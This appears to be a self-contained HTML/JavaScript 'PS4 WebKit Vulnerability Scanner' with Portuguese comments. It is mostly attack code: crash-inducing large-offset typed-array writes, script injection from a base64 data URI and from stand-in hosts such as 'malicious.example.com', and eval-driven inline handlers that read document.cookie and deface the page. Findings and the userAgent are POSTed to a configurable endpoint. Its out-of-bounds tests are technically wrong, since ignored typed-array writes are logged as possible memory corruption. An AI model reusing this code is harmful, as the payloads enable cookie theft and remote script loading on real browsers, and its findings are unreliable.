<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 WebKit Vulnerability Scanner | POC + Direct Impact + Notification</title>
    <style>
        /* Estilos CSS permanecem os mesmos */
        body { background: #000; color: #0f0; font-family: monospace; padding: 20px; }
        #log { background: #111; border: 1px solid #333; padding: 15px; height: 600px; overflow-y: auto; white-space: pre-wrap; margin-top: 15px; }
        #browserInfo { margin-bottom: 15px; border: 1px solid #555; padding: 10px; }
        button { background: #f44336; color: white; border: none; padding: 8px 15px; margin: 5px; border-radius: 3px; }
        select { background: #222; color: #0f0; border: 1px solid #333; padding: 5px; margin: 5px; }
        .success { color: #4CAF50; }
        .danger { color: #f44336; }
        .warning { color: #FFC107; }
        .info { color: #2196F3; }
        .section { color: #9C27B0; font-weight: bold; margin: 10px 0; }
        .poc-potential { color: #FF9800; font-weight: bold; }
        .defense-bypass { color: #00BCD4; font-weight: bold; }
        .privilege-escalation { color: #FF4081; font-weight: bold; }
        .impact { color: #E91E63; font-style: italic; }
        .notification { color: #7B1FA2; font-style: italic; } /* Classe para logs de notificação */
    </style>
</head>
<body>
    <h1>PS4 WebKit Vulnerability Scanner | POC + Direct Impact + Notification</h1>

    <div id="browserInfo">
        <strong>User Agent:</strong> <span id="userAgent"></span><br>
        <strong>Platform:</strong> <span id="platform"></span><br>
        <strong>Notification Endpoint:</strong> <span id="notificationEndpointDisplay"></span>
    </div>

    <div>
        <select id="testSelector">
            <option value="all_aggressive">Run All Aggressive Tests (Direct Impact + Notify)</option>
            <option value="oob_write_aggressive">Aggressive ArrayBuffer OOB Write Investigation</option>
            <option value="oob_impact_tests">OOB Impact Demonstration Tests</option>
            <option value="csp_bypass_aggressive">Aggressive CSP Bypass Attempts (Direct Impact + Notify)</option>
        </select>
        <button onclick="runSelectedTest()">Run Selected Test (Aggressive)</button>
        <button onclick="clearLog()">Clear Log</button>
    </div>

    <div id="log"></div>

<script>
// ======================
// CONFIGURAÇÃO IMPORTANTE!
// ======================
// SUBSTITUA ESTA URL PELO SEU ENDPOINT PARA RECEBER AS NOTIFICAÇÕES
// Exemplo usando httpbin (ele apenas ecoa o POST): 'https://httpbin.org/post'
// Use um serviço como Beeceptor.com ou seu próprio servidor.
const NOTIFICATION_ENDPOINT = 'https://httpbin.org/post'; // <-- MUDE AQUI!

// ======================
// Coleta de Informações e Logging
// ======================
document.addEventListener('DOMContentLoaded', function() {
    const userAgentElement = document.getElementById('userAgent');
    const platformElement = document.getElementById('platform');
    try {
        if (userAgentElement) userAgentElement.textContent = navigator.userAgent;
    } catch (e) { console.error("Error getting userAgent:", e); if (userAgentElement) userAgentElement.textContent = "N/A"; }
    try {
        if (platformElement) platformElement.textContent = navigator.platform;
    } catch (e) { console.error("Error getting platform:", e); if (platformElement) platformElement.textContent = "N/A"; }
    // Exibe o endpoint configurado
    const endpointDisplay = document.getElementById('notificationEndpointDisplay');
    if(endpointDisplay) endpointDisplay.textContent = NOTIFICATION_ENDPOINT;
});

function log(message, type = '') {
    const logDiv = document.getElementById('log');
    if (logDiv) {
        const line = document.createElement('div');
        const timestamp = `[${new Date().toLocaleTimeString()}] `;
        const textNode = document.createTextNode(timestamp + message.replace(/<[^>]*>/g, '')); // Basic sanitation
        // Permite que spans específicos dos logs sejam renderizados como HTML
        if (type && message.startsWith('<span')) {
             line.innerHTML = timestamp + message;
             // Adiciona classes CSS se necessário para spans (permite múltiplas classes separadas por espaço)
             if (type) line.classList.add(...type.split(' '));
        } else {
            line.appendChild(textNode);
            if (type) line.className = type;
        }
        logDiv.appendChild(line);
        logDiv.scrollTop = logDiv.scrollHeight; // Auto-scroll
    } else {
        console.error("Error: #log element not found!");
    }
}


function clearLog() {
    const logDiv = document.getElementById('log');
    if (logDiv) {
        logDiv.innerHTML = '';
    }
}

// Flag global APENAS para OOB (para controlar testes de impacto OOB)
var potentialVulnsFound = {
    oobWrite: false
};

// ======================
// Função para Enviar Notificação via Fetch
// ======================
async function sendVulnerabilityNotification(payload) {
    if (!NOTIFICATION_ENDPOINT || NOTIFICATION_ENDPOINT === 'YOUR_ENDPOINT_HERE' || NOTIFICATION_ENDPOINT === 'https://httpbin.org/post') {
         log(`[NOTIFY] Notification sending skipped: Endpoint not configured or using placeholder.`, 'notification warning');
         if (NOTIFICATION_ENDPOINT === 'https://httpbin.org/post') {
            console.warn("Notification endpoint is set to httpbin.org/post for testing. Change it to receive notifications properly.");
         } else {
            console.error("Please configure the NOTIFICATION_ENDPOINT constant in the script!");
         }
         return; // Não envia se não estiver configurado
    }

    log(`[NOTIFY] Sending notification for: ${payload.vulnerability}...`, 'notification info');
    try {
        const response = await fetch(NOTIFICATION_ENDPOINT, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                // Poderia adicionar outros headers se necessário pelo seu endpoint
            },
            // Corpo da requisição: inclui timestamp, UA, plataforma e o payload específico da vulnerabilidade
            body: JSON.stringify({
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                finding: payload // O objeto com os detalhes da vulnerabilidade
            }),
            mode: 'cors', // Necessário se seu endpoint estiver em outro domínio
            // Pode precisar de 'no-cors' dependendo do seu endpoint, mas aí não verá a resposta
            // Se usar 'no-cors', a Promise de fetch resolve mesmo se houver erro de CORS,
            // mas response.ok será false e o status será 0.
        });

        // Verifica se a requisição foi bem-sucedida (status 2xx)
        if (response.ok) {
            log(`[NOTIFY] Notification sent successfully to ${NOTIFICATION_ENDPOINT}. Status: ${response.status}`, 'notification success');
            // Opcional: Ver a resposta do endpoint (útil para httpbin ou APIs que retornam algo)
            // try {
            //      const responseData = await response.json();
            //      console.log("Notification Response Data:", responseData);
            // } catch (e) { console.log("Notification response wasn't JSON or couldn't be parsed."); }
        } else {
             // Logar erro se o status não for OK (ex: 4xx, 5xx)
            log(`[NOTIFY] Failed to send notification. Status: ${response.status} ${response.statusText}`, 'notification danger');
        }
    } catch (error) {
        // Captura erros de rede ou falhas na própria função fetch
        log(`[NOTIFY] Error sending notification via fetch: ${error.message}`, 'notification danger');
        console.error("Notification Fetch Error Details:", error);
    }
}


// ======================
// Funções Auxiliares para Demonstração de Impacto (globais)
// ======================
function demonstrateCookieRead() {
    try {
        const cookies = document.cookie || '(no cookies found or readable)';
        log('[IMPACT-CSP] Cookie Read Attempt Result: ' + cookies, 'impact danger');
    } catch(e) {
        log('[IMPACT-CSP] Error reading cookies: ' + e.message, 'danger');
    }
}

function demonstrateDomManipulation() {
    try {
        const divId = 'csp-impact-div-' + Date.now();
        const div = document.createElement('div');
        div.id = divId;
        div.style.position = 'fixed';
        div.style.top = '0'; div.style.left = '0'; div.style.width = '100%';
        div.style.background = 'red'; div.style.color = 'white';
        div.style.textAlign = 'center'; div.style.padding = '10px';
        div.style.zIndex = '9999';
        div.textContent = '!! CSP Bypass Impact: DOM Manipulation Successful !!';
        const oldDiv = document.getElementById('csp-impact-div-active');
        if(oldDiv) { try{ document.body.removeChild(oldDiv); } catch(e){} }
        div.id = 'csp-impact-div-active';
        document.body.appendChild(div);
        log('[IMPACT-CSP] DOM Manipulation Executed: Injected red bar.', 'impact danger');
    } catch(e) {
        log('[IMPACT-CSP] Error manipulating DOM: ' + e.message, 'danger');
    }
}

function demonstrateNetworkRequest() {
    const targetUrl = 'https://httpbin.org/get?csp_bypass_poc_direct=true'; // Exemplo
    try {
        log('[IMPACT-CSP] Attempting network request (fetch) to ' + targetUrl + '...', 'info');
        fetch(targetUrl)
            .then(response => {
                if (response.ok) {
                    log('[IMPACT-CSP] Network Request Successful: Received response from ' + targetUrl + '. Status: ' + response.status, 'impact danger');
                } else {
                    log('[IMPACT-CSP] Network Request Failed: Received non-OK response from ' + targetUrl + '. Status: ' + response.status, 'warning');
                }
            })
            .catch(error => {
                log('[IMPACT-CSP] Network Request Error: Could not fetch ' + targetUrl + '. Error: ' + error.message, 'warning');
                log('[IMPACT-CSP] Note: Check CSP connect-src, CORS, network issues.', 'info');
            });
    } catch(e) {
        log('[IMPACT-CSP] Error attempting fetch: ' + e.message, 'danger');
    }
}

// ======================
// Aggressive POC Tests (Com Notificações Integradas)
// ======================
const aggressiveTests = {

    "oob_write_aggressive": async function() {
        log("[EXPLOIT] Aggressive ArrayBuffer OOB Write Investigation...", "info");
        potentialVulnsFound.oobWrite = false;
        try {
            const bufferSize = 32;
            const buffer = new ArrayBuffer(bufferSize);
            const view = new Uint8Array(buffer);
            const writeValue = 0xEE;
            const offsets = [-10, -1, 0, bufferSize - 1, bufferSize, bufferSize + 1, bufferSize + 10, bufferSize * 2, bufferSize * 10];
            const readOffsets = [-5, 0, 5, bufferSize - 5, bufferSize - 1, bufferSize, bufferSize + 5];

            for (const writeOffset of offsets) {
                log(`[OOB-AGG] Attempting to write 0x${writeValue.toString(16)} at offset ${writeOffset}...`, "info");
                try {
                    view[writeOffset] = writeValue;
                    log(`⚠️ OOB write at offset ${writeOffset} successful (no error).`, "warning");
                     potentialVulnsFound.oobWrite = true;
                     // Opcional: Notificar sobre escrita OOB bem sucedida (pode ser muito verboso)
                     // sendVulnerabilityNotification({ vulnerability: 'OOB_WRITE_SUCCESS', details: `Write at offset ${writeOffset} did not error.` });

                    for (const readOffset of readOffsets) {
                        try {
                            await new Promise(resolve => setTimeout(resolve, 50));
                            const readValue = view[readOffset];
                            log(`[OOB-AGG] Read 0x${(readValue !== undefined ? readValue.toString(16) : 'undef')} at offset ${readOffset} after write at ${writeOffset}.`, "info");

                            if (readOffset >= 0 && readOffset < bufferSize && readValue === writeValue && (writeOffset >= bufferSize || writeOffset < 0)) {
                                const detailMsg = `Wrote at ${writeOffset}, read 0x${readValue.toString(16)} at IN-BOUNDS offset ${readOffset}.`;
                                log(`<span class="poc-potential defense-bypass privilege-escalation">🚩 Potential OOB Write Corruption: ${detailMsg}</span>`, "danger");
                                sendVulnerabilityNotification({ vulnerability: 'OOB_WRITE_CORRUPTION', details: detailMsg }); // <-- Notificação
                            }
                        } catch (readError) {
                             log(`⚠️ Error reading at offset ${readOffset}: ${readError.message}`, "warning");
                        }
                    }
                } catch (writeError) {
                    log(`✅ OOB write at offset ${writeOffset} blocked/error: ${writeError.message}`, "success");
                }
                await new Promise(resolve => setTimeout(resolve, 100));
            }
            log("[OOB-AGG] Completed aggressive OOB write testing.", "info");
        } catch (e) {
            log(`❌ Test error (OOB Write): ${e.message}`, "danger");
            console.error(e);
        }
    },

    "test_oob_metadata": async function() {
        log("[IMPACT-OOB] Attempting OOB write to corrupt metadata (e.g., length)...", "section");
        if (!potentialVulnsFound.oobWrite) {
             log("Skipping OOB impact test: Initial OOB write did not seem possible.", "warning"); return;
        }
        try {
            const bufferSize = 32; const buffer = new ArrayBuffer(bufferSize); const view = new Uint8Array(buffer);
            const initialLength = buffer.byteLength; log(`[IMPACT-OOB] Initial buffer length: ${initialLength}`, "info");
            const suspectOffsets = [-8, -4, bufferSize]; const writeValue = 0xFF;

            for(const offset of suspectOffsets) {
                try {
                    log(`[IMPACT-OOB] Attempting OOB write 0x${writeValue.toString(16)} at offset ${offset}...`, "info");
                    view[offset] = writeValue;
                    log(`[IMPACT-OOB] OOB write at offset ${offset} successful. Checking length...`, "warning");
                    await new Promise(resolve => setTimeout(resolve, 100));
                    const currentLength = buffer.byteLength;
                    log(`[IMPACT-OOB] Buffer length after write at ${offset}: ${currentLength}`, "info");
                    if (currentLength !== initialLength) {
                        const detailMsg = `Buffer length changed from ${initialLength} to ${currentLength} after OOB write at offset ${offset}!`;
                        log(`<span class="poc-potential privilege-escalation impact">🚨 Potential Metadata Corruption: ${detailMsg}</span>`, "danger impact");
                        sendVulnerabilityNotification({ vulnerability: 'OOB_METADATA_CORRUPTION', details: detailMsg }); // <-- Notificação
                        try {
                             log(`[IMPACT-OOB] Attempting access using corrupted length ${currentLength}...`, "info");
                             const corruptedView = new Uint8Array(buffer, 0, currentLength);
                             log(`[IMPACT-OOB] Access using new length ${currentLength} OK. Last byte: ${corruptedView[currentLength-1]?.toString(16)}`, "warning");
                        } catch(e_access) {
                             log(`[IMPACT-OOB] Error accessing buffer with corrupted length ${currentLength}: ${e_access.message}`, "danger");
                        }
                        return; // Para após detectar a primeira corrupção de metadados
                    }
                } catch(e_write) {
                     log(`[IMPACT-OOB] OOB Write at ${offset} failed: ${e_write.message}`, "success");
                }
            }
            log("[IMPACT-OOB] Metadata corruption test finished, no length change detected.", "info");
        } catch (e) {
            log(`❌ Test error (OOB Metadata): ${e.message}`, "danger"); console.error(e);
        }
    },

    "test_oob_crash_probe": async function() {
        log("[IMPACT-OOB] Attempting OOB writes with large offsets/values to probe for crashes...", "section");
        if (!potentialVulnsFound.oobWrite) {
             log("Skipping OOB crash probe: Initial OOB write did not seem possible.", "warning"); return;
        }
        try {
            const bufferSize = 32; const buffer = new ArrayBuffer(bufferSize); const view = new Uint8Array(buffer);
            const largeOffsets = [bufferSize * 100, bufferSize * 1000, 0xFFFF, 0xFFFFF, 0xFFFFFF];
            const largeValues = [0xFF, 0xDEAD, 0xBEEF, 0xCAFE];

            for (const offset of largeOffsets) {
                 for (const value of largeValues) {
                    log(`[IMPACT-OOB-CRASH] Attempting OOB write 0x${value.toString(16)} at large offset ${offset}... (Browser may crash)`, "warning");
                     try {
                         view[offset] = value & 0xFF;
                         log(`[IMPACT-OOB-CRASH] Write at ${offset} completed without immediate error.`, "info");
                         await new Promise(resolve => setTimeout(resolve, 200));
                     } catch (e_write) {
                         log(`[IMPACT-OOB-CRASH] Write at ${offset} failed: ${e_write.message}.`, "success");
                         break;
                     }
                 }
                 await new Promise(resolve => setTimeout(resolve, 500));
            }
            log("[IMPACT-OOB-CRASH] Crash probe finished. If browser didn't crash, these specific writes were handled.", "info");
        } catch (e) {
            log(`❌ Test error (OOB Crash Probe): ${e.message}. Browser might have crashed earlier.`, "danger"); console.error(e);
        }
    },

     "csp_bypass_aggressive": async function() {
        log("[PRIV-ESC] Aggressive CSP Bypass Attempts (Direct Impact + Notify)...", "info");
        const impactPayloadJsString = `console.log('Executing CSP Bypass Payload...'); try{demonstrateCookieRead();}catch(e){console.error(e);} try{demonstrateDomManipulation();}catch(e){console.error(e);} try{demonstrateNetworkRequest();}catch(e){console.error(e);} console.log('CSP Bypass Payload Execution Finished.');`;
        let impactPayloadBase64 = ''; try { impactPayloadBase64 = btoa(impactPayloadJsString); log("[CSP-AGG] Generated Base64 payload.", "info"); } catch (e) { log("Error generating Base64: " + e.message, "danger"); return; }
        const impactPayloadInlineString = `console.log('Executing Inline Payload...'); try{demonstrateCookieRead();}catch(e){console.error(e);} try{demonstrateDomManipulation();}catch(e){console.error(e);} try{demonstrateNetworkRequest();}catch(e){console.error(e);} console.log('Inline Payload Finished.');`.replace(/"/g, '&quot;');
        const scriptSources = [ `data:text/javascript;base64,${impactPayloadBase64}`, 'http://malicious.example.com/s.js', 'https://malicious.example.com/s.js', 'blob:null/someBlob', 'javascript:console.log("js URI executed?")', 'vbscript:console.log("vbscript executed?")', 'ftp://malicious.example.com/s.js', '//malicious.example.com/s.js'];

        for (const src of scriptSources) {
            log(`[CSP-AGG] Testing src: ${src.substring(0,100)}${src.length > 100 ? '...' : ''}`, "info");
            await new Promise(resolve => {
                 const script = document.createElement('script');
                 const cleanup = () => { try { document.body.removeChild(script); } catch(e) {} resolve(); };
                 script.onerror = () => { log(`⚠️ Script load error (CSP block?) for: ${src.substring(0,100)}...`, "warning"); cleanup(); };
                 script.onload = () => {
                     const successMsg = `Script loaded from ${src.substring(0,30)}...`;
                     log(`<span class="poc-potential defense-bypass privilege-escalation impact">🚩 CSP Bypass & Impact Executed: ${successMsg}</span>`, "danger impact");
                     const payload = { details: successMsg, impact_demonstrated: ['COOKIE_READ', 'DOM_MANIPULATION', 'NETWORK_REQUEST_ATTEMPTED'] };
                     if (src.startsWith('data:')) { payload.vulnerability = 'CSP_BYPASS_DATA_URI'; }
                     else { payload.vulnerability = 'CSP_BYPASS_OTHER_SRC'; } // Not expected but handle
                     sendVulnerabilityNotification(payload); // <-- Notificação
                     cleanup();
                 };
                 try {
                    script.src = src; document.body.appendChild(script);
                    setTimeout(() => { if (script.parentNode) { log(`⚠️ Script load timeout for: ${src.substring(0,100)}...`, "warning"); cleanup(); } }, 1500);
                 } catch(e) { log(`❌ Error injecting ${src.substring(0,100)}...: ${e.message}`, "danger"); cleanup(); }
            });
             await new Promise(resolve => setTimeout(resolve, 100));
        }

        log("[CSP-AGG] Testing inline script attributes (Direct Impact + Notify)...", "info");
        const eventAttributes = ['onerror', 'onload'];
        for (const attr of eventAttributes) {
            log(`[CSP-AGG] Setting up inline test for ${attr}...`, "info");
            await new Promise(async resolve => {
                const testElement = document.createElement('img'); let bypassDetected = false;
                const uniqueWrapperName = `cspInlineWrapper_${attr}_${Date.now()}`;
                window[uniqueWrapperName] = () => {
                     if (!bypassDetected) {
                         const successMsg = `Inline script via ${attr} triggered!`;
                         log(`<span class="poc-potential defense-bypass privilege-escalation impact">🚩 CSP Bypass & Impact Executed: ${successMsg}</span>`, "danger impact");
                         bypassDetected = true;
                         sendVulnerabilityNotification({ // <-- Notificação
                             vulnerability: 'CSP_BYPASS_INLINE', event_handler: attr, details: successMsg,
                             impact_demonstrated: ['COOKIE_READ', 'DOM_MANIPULATION', 'NETWORK_REQUEST_ATTEMPTED']
                         });
                     }
                     try { eval(impactPayloadInlineString.replace(/&quot;/g, '"')); } catch(evalError) { log(`Eval error in inline wrapper: ${evalError.message}`, 'danger');}
                     console.log(`Inline payload via ${attr} potentially executed.`);
                };
                const inlineCode = `try{window['${uniqueWrapperName}']();}catch(e){console.error(e);}`;
                testElement.setAttribute(attr, inlineCode);
                if (attr === 'onerror') { testElement.src = 'invalid-image-source-' + Math.random(); }
                else if (attr === 'onload') { testElement.src = 'data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7'; }
                document.body.appendChild(testElement); await new Promise(r => setTimeout(r, 500));
                if (!bypassDetected) { log(`[CSP-AGG] Inline script via ${attr} likely blocked.`, "info"); }
                try { document.body.removeChild(testElement); } catch(e){} delete window[uniqueWrapperName]; resolve();
            });
             await new Promise(resolve => setTimeout(resolve, 100));
        }
        log("[CSP-AGG] Completed aggressive CSP bypass testing (Direct Impact + Notify).", "info");
    },

    "all_aggressive": async function() {
        log("=== Running All Aggressive Tests (Direct Impact + Notify Version) ===", "section");
        await aggressiveTests["oob_write_aggressive"]();
        log("Pausing 5s after OOB write...", "info"); await new Promise(r => setTimeout(r, 5000));
        if (potentialVulnsFound.oobWrite) {
             await aggressiveTests["test_oob_metadata"](); await new Promise(r => setTimeout(r, 1000));
             await aggressiveTests["test_oob_crash_probe"](); log("Pausing 5s after OOB impact...", "info"); await new Promise(r => setTimeout(r, 5000));
        } else { log("Skipping OOB impact tests.", "warning"); }
        await aggressiveTests["csp_bypass_aggressive"]();
        log("\n=== All Tests Completed. Review logs & endpoint. ===", "section");
    },

    "oob_impact_tests": async function() {
        log("=== Running OOB Impact Tests Only ===", "section");
          if (!potentialVulnsFound.oobWrite) { log("Warning: Run main OOB test first or results may be limited.", "warning"); }
          await aggressiveTests["test_oob_metadata"](); await new Promise(r => setTimeout(r, 1000));
          await aggressiveTests["test_oob_crash_probe"]();
          log("\n=== OOB Impact Tests Completed ===", "section");
    }
};

// ======================
// Test Runner
// ======================
async function runSelectedTest() {
    const testSelector = document.getElementById('testSelector');
    const selectedTest = testSelector.value;
    if (selectedTest === "oob_impact_tests" && !potentialVulnsFound.oobWrite) {
        log("Warning: Running OOB Impact tests, but main OOB test success wasn't recorded. Run 'All Aggressive Tests' or 'OOB Write Investigation' first for best results.", "warning");
    }
    clearLog(); log("=== Starting Selected Tests ===", "section");
    if (aggressiveTests[selectedTest]) {
        await aggressiveTests[selectedTest]();
        log(`\n=== Test Execution for "${selectedTest}" Completed. Review logs & endpoint. ===`, "section");
    } else { log(`Error: Test "${selectedTest}" not found.`, "danger"); }
}
</script>
</body>
</html>
